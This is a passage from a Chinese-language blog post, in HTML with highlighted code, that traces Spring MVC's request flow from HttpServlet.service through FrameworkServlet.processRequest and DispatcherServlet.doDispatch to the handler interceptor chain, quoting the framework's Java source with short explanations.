   doPost(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_PUT)) &#123;</span><br><span class="line">           doPut(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_DELETE)) &#123;</span><br><span class="line">           doDelete(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_OPTIONS)) &#123;</span><br><span class="line">           doOptions(req,resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_TRACE)) &#123;</span><br><span class="line">           doTrace(req,resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//</span></span><br><span class="line">           <span class="comment">// Note that this means NO servlet supports whatever</span></span><br><span class="line">           <span class="comment">// method was requested, anywhere on this server.</span></span><br><span class="line">           <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">           String errMsg = lStrings.getString(<span class="string">"http.method_not_implemented"</span>);</span><br><span class="line">           Object[] errArgs = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">           errArgs[<span class="number">0</span>] = method;</span><br><span class="line">           errMsg = MessageFormat.format(errMsg, errArgs);</span><br><span class="line"></span><br><span class="line">           resp.sendError(HttpServletResponse.SC_NOT_IMPLEMENTED, errMsg);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>这段代码就是根据请求的类型调用相应的处理方法</p>
<p>这个方法又在<code>FrameWorkServlet</code>中被重写，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Override the parent class implementation in order to intercept PATCH requests.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (HttpMethod.PATCH.matches(request.getMethod())) &#123;</span><br><span class="line">    processRequest(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.service(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>又增加了一个处理PATCH请求的方法，其他的还是调用<code>HttpServlet</code>的实现。</p>
<p>同时，<code>FrameWorkServlet</code>又将<code>HttpServlet</code>中对应的各种HTTP请求的方法都进行了重写，如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Delegate GET requests to processRequest/doService.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Will also be invoked by HttpServlet's default implementation of &#123;<span class="doctag">@code</span> doHead&#125;,</span></span><br><span class="line"><span class="comment">	 * with a &#123;<span class="doctag">@code</span> NoBodyResponse&#125; that just captures the content length.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #doService</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #doHead</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">		processRequest(request, response);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>所有的请求都被委托给了<code>processRequest</code>这个方法，它的实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Process this request, publishing an event regardless of the outcome.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;The actual event handling is performed by the abstract</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@link</span> #doService&#125; template method.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">processRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">		Throwable failureCause = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();</span><br><span class="line">		LocaleContext localeContext = buildLocaleContext(request);</span><br><span class="line"></span><br><span class="line">		RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();</span><br><span class="line">		ServletRequestAttributes requestAttributes = buildRequestAttributes(request, response, previousAttributes);</span><br><span class="line"></span><br><span class="line">		WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line">		asyncManager.registerCallableInterceptor(FrameworkServlet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">new</span> <span class="title">RequestBindingInterceptor</span>())</span>;</span><br><span class="line"></span><br><span class="line">		initContextHolders(request, localeContext, requestAttributes);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			doService(request, response);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (ServletException ex) &#123;</span><br><span class="line">			failureCause = ex;</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">			failureCause = ex;</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">			failureCause = ex;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> NestedServletException(<span class="string">"Request processing failed"</span>, ex);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">finally</span> &#123;</span><br><span class="line">			resetContextHolders(request, previousLocaleContext, previousAttributes);</span><br><span class="line">			<span class="keyword">if</span> (requestAttributes != <span class="keyword">null</span>) &#123;</span><br><span class="line">				requestAttributes.requestCompleted();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (failureCause != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">this</span>.logger.debug(<span class="string">"Could not complete request"</span>, failureCause);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">						logger.debug(<span class="string">"Leaving response open for concurrent processing"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="keyword">this</span>.logger.debug(<span class="string">"Successfully completed request"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			publishRequestHandledEvent(request, response, startTime, failureCause);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码的异常处理很值得借鉴，上述代码中<code>doService(request, response)</code>是核心。</p>
<p>它是<code>FrameWorkServlet</code>中定义的一个接口，它在<code>DispatcherServlet</code>中被实现。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Subclasses must implement this method to do the work of request handling,</span></span><br><span class="line"><span class="comment"> * receiving a centralized callback for GET, POST, PUT and DELETE.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;The contract is essentially the same as that for the commonly overridden</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> doGet&#125; or &#123;<span class="doctag">@code</span> doPost&#125; methods of HttpServlet.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class intercepts calls to ensure that exception handling and</span></span><br><span class="line"><span class="comment"> * event publication takes place.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response current HTTP response</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception in case of any kind of processing failure</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> javax.servlet.http.HttpServlet#doGet</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> javax.servlet.http.HttpServlet#doPost</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure></p>
<p><code>DispatcherServlet</code>中的<code>doService</code>接口代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Exposes the DispatcherServlet-specific request attributes and delegates to &#123;<span class="doctag">@link</span> #doDispatch&#125;</span></span><br><span class="line"><span class="comment">	 * for the actual dispatching.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">			String resumed = WebAsyncUtils.getAsyncManager(request).hasConcurrentResult() ? <span class="string">" resumed"</span> : <span class="string">""</span>;</span><br><span class="line">			logger.debug(<span class="string">"DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span> + resumed +</span><br><span class="line">					<span class="string">" processing "</span> + request.getMethod() + <span class="string">" request for ["</span> + getRequestUri(request) + <span class="string">"]"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Keep a snapshot of the request attributes in case of an include,</span></span><br><span class="line">		<span class="comment">// to be able to restore the original attributes after the include.</span></span><br><span class="line">		Map&lt;String, Object&gt; attributesSnapshot = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">if</span> (WebUtils.isIncludeRequest(request)) &#123;</span><br><span class="line">			attributesSnapshot = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">			Enumeration&lt;?&gt; attrNames = request.getAttributeNames();</span><br><span class="line">			<span class="keyword">while</span> (attrNames.hasMoreElements()) &#123;</span><br><span class="line">				String attrName = (String) attrNames.nextElement();</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">this</span>.cleanupAfterInclude || attrName.startsWith(<span class="string">"org.springframework.web.servlet"</span>)) &#123;</span><br><span class="line">					attributesSnapshot.put(attrName, request.getAttribute(attrName));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Make framework objects available to handlers and view objects.</span></span><br><span class="line">		request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE, getWebApplicationContext());</span><br><span class="line">		request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, <span class="keyword">this</span>.localeResolver);</span><br><span class="line">		request.setAttribute(THEME_RESOLVER_ATTRIBUTE, <span class="keyword">this</span>.themeResolver);</span><br><span class="line">		request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());</span><br><span class="line"></span><br><span class="line">		FlashMap inputFlashMap = <span class="keyword">this</span>.flashMapManager.retrieveAndUpdate(request, response);</span><br><span class="line">		<span class="keyword">if</span> (inputFlashMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">			request.setAttribute(INPUT_FLASH_MAP_ATTRIBUTE, Collections.unmodifiableMap(inputFlashMap));</span><br><span class="line">		&#125;</span><br><span class="line">		request.setAttribute(OUTPUT_FLASH_MAP_ATTRIBUTE, <span class="keyword">new</span> FlashMap());</span><br><span class="line">		request.setAttribute(FLASH_MAP_MANAGER_ATTRIBUTE, <span class="keyword">this</span>.flashMapManager);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			doDispatch(request, response);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (!WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">				<span class="comment">// Restore the original attribute snapshot, in case of an include.</span></span><br><span class="line">				<span class="keyword">if</span> (attributesSnapshot != <span class="keyword">null</span>) &#123;</span><br><span class="line">					restoreAttributesAfterInclude(request, attributesSnapshot);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>每次请求过来都会将系统的一些属性塞到request的attribute中，以便后面的handlers和view能够访问到。</p>
<p>其中比较重要的是 <code>doDispatch(request, response)</code>，正是这个方法使得请求被真正的转发。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Process the actual dispatching to the handler.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;The handler will be obtained by applying the servlet's HandlerMappings in order.</span></span><br><span class="line"><span class="comment">	 * The HandlerAdapter will be obtained by querying the servlet's installed HandlerAdapters</span></span><br><span class="line"><span class="comment">	 * to find the first that supports the handler class.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;All HTTP methods are handled by this method. It's up to HandlerAdapters or handlers</span></span><br><span class="line"><span class="comment">	 * themselves to decide which methods are acceptable.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> response current HTTP response</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> Exception in case of any kind of processing failure</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doDispatch</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		HttpServletRequest processedRequest = request;</span><br><span class="line">		HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">boolean</span> multipartRequestParsed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			ModelAndView mv = <span class="keyword">null</span>;</span><br><span class="line">			Exception dispatchException = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				processedRequest = checkMultipart(request);</span><br><span class="line">				multipartRequestParsed = (processedRequest != request);</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Determine handler for the current request.</span></span><br><span class="line">				mappedHandler = getHandler(processedRequest);</span><br><span class="line">				<span class="keyword">if</span> (mappedHandler == <span class="keyword">null</span> || mappedHandler.getHandler() == <span class="keyword">null</span>) &#123;</span><br><span class="line">					noHandlerFound(processedRequest, response);</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Determine handler adapter for the current request.</span></span><br><span class="line">				HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Process last-modified header, if supported by the handler.</span></span><br><span class="line">				String method = request.getMethod();</span><br><span class="line">				<span class="keyword">boolean</span> isGet = <span class="string">"GET"</span>.equals(method);</span><br><span class="line">				<span class="keyword">if</span> (isGet || <span class="string">"HEAD"</span>.equals(method)) &#123;</span><br><span class="line">					<span class="keyword">long</span> lastModified = ha.getLastModified(request, mappedHandler.getHandler());</span><br><span class="line">					<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">						logger.debug(<span class="string">"Last-Modified value for ["</span> + getRequestUri(request) + <span class="string">"] is: "</span> + lastModified);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">new</span> ServletWebRequest(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;</span><br><span class="line">						<span class="keyword">return</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Actually invoke the handler.</span></span><br><span class="line">				mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				applyDefaultViewName(processedRequest, mv);</span><br><span class="line">				mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">				dispatchException = ex;</span><br><span class="line">			&#125;</span><br><span class="line">			processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">			triggerAfterCompletion(processedRequest, response, mappedHandler, ex);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Error err) &#123;</span><br><span class="line">			triggerAfterCompletionWithError(processedRequest, response, mappedHandler, err);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">				<span class="comment">// Instead of postHandle and afterCompletion</span></span><br><span class="line">				<span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">					mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// Clean up any resources used by a multipart request.</span></span><br><span class="line">				<span class="keyword">if</span> (multipartRequestParsed) &#123;</span><br><span class="line">					cleanupMultipart(processedRequest);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>handler 获取的顺序是从DispatcherServlet的HandlerMapping中按顺序取出的</p>
<p>Handler对应的HandlerAdapter会从安装的HandlerAdapter找，将返回第一个合适的Adapter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HandlerExecutionChain mappedHandler = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine handler for the current request.</span></span><br><span class="line">mappedHandler = getHandler(processedRequest);</span><br><span class="line">            ...</span><br><span class="line"><span class="comment">// Determine handler adapter for the current request.</span></span><br><span class="line">HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Actually invoke the handler.</span></span><br><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br><span class="line"></span><br><span class="line">mappedHandler.applyPostHandle(processedRequest, response, mv);</span><br><span class="line"></span><br><span class="line">processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);</span><br></pre></td></tr></table></figure>
<p>在applyPreHandle中也是检查拦截器的操作，并根据拦截器返回的布尔类型，判断是否进一步处理</p>
<p>其中在applyPostHandle中又检查是否有各种拦截器,调用拦截器的postHandle方法</p>
<p>处理完毕后，调用processDispatchResult方法将处理后的请求和mv进行分发</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HandlerExecutionChain.java</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Apply preHandle methods of registered interceptors.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if the execution chain should proceed with the</span></span><br><span class="line"><span class="comment">	 * next interceptor or the handler itself. Else, DispatcherServlet assumes</span></span><br><span class="line"><span class="comment">	 * that this interceptor has already dealt with the response itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">applyPreHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">		<span class="keyword">if</span> (!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interceptors.length; i++) &#123;</span><br><span class="line">				HandlerInterceptor interceptor = interceptors[i];</span><br><span class="line">				<span class="keyword">if</span> (!interceptor.preHandle(request, response, <span class="keyword">this</span>.handler)) &#123;</span><br><span class="line">					triggerAfterCompletion(request, response, <span class="keyword">null</span>);</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">this</span>.interceptorIndex = i;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* Apply postHandle methods of registered interceptors.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">applyPostHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, ModelAndView mv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">	<span class="keyword">if</span> 